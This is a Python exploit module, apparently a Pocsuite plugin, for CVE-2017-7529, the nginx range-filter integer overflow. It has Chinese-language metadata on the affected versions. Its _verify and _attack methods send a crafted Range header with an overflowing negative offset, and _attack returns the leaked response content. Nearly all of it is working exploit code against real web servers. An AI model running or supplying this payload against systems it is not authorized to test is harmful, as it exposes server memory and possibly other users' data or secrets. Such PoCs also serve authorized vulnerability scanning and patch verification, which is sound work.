#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import socket
from dns import resolver, query, exception


class Nginx_Interger_Overflow_Poc(POCBase):
    vulID = "CVE-2017-7529"
    version = "1"
    author = "akame"
    vulDate = "2017-8-12"
    createDate = "2017-8-12"
    updateDate = "2017-8-12"
    # 漏洞地址来源,0day不用写
    references = ['http://www.freebuf.com/articles/terminal/140402.html']
    name = 'CVE-2017-7529 Nginx整数溢出漏洞 PoC'  # PoC 名称
    appPowerLink = 'http://nginx.org/'  # 漏洞厂商主页地址
    appName = 'nginx'  # 漏洞应用名称
    appVersion = '0.5.6-1.13.2'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        在Nginx的range filter中存在整数溢出漏洞，
        可以通过带有特殊构造的range的HTTP头的恶意请求引发这个整数溢出漏洞，并导致信息泄露。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        vul_url = self.url
        result = {}
        headers = req.get(vul_url, timeout=10).headers
        file_len = headers["Content-Length"]
        headers = {"Range": "bytes=-{},-9223372036854{}".format(
            int(file_len) + 623, 776000 - (int(file_len) + 623))}
        r = req.get(vul_url, headers=headers)
        if r.status_code == 206 and "Content-Range" in r.content:
            result['content'] = r.content
        return self.parse_attack(result)

    def _verify(self, verify=True):
        vul_url = self.url
        result = {}
        headers = req.get(vul_url, timeout=10).headers
        file_len = headers["Content-Length"]
        headers = {"Range": "bytes=-{},-9223372036854{}".format(
            int(file_len) + 623, 776000 - (int(file_len) + 623))}
        r = req.get(vul_url, headers=headers)
        if r.status_code == 206 and "Content-Range" in r.content:
            result['desc'] = "Vuln url"
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(Nginx_Interger_Overflow_Poc)
